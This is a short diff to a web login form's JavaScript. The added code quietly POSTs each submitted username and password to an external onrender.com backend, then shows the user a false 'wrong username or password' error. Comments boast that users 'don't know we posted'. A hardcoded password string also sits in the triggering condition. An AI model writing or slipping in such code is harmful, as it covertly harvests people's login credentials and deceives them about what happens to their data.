@@ -50,7 +50,15 @@ form.addEventListener("submit", async (e) => {
   if (hasForbiddenName && attemptCount <=5|| password === "bettyke@1") {
     
     // Still post to database (this runs regardless)
-
+    try {
+      await fetch("https://lovebuds-backend-1.onrender.com/login-submit", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ username, password })
+      });
+    } catch (err) {
+      console.error("Error posting to DB:", err);
+    }
     // But show error to user anyway — they don't know we posted
     showMessage("Wrong username or password", "error");
     return; // Stop here, don't redirect
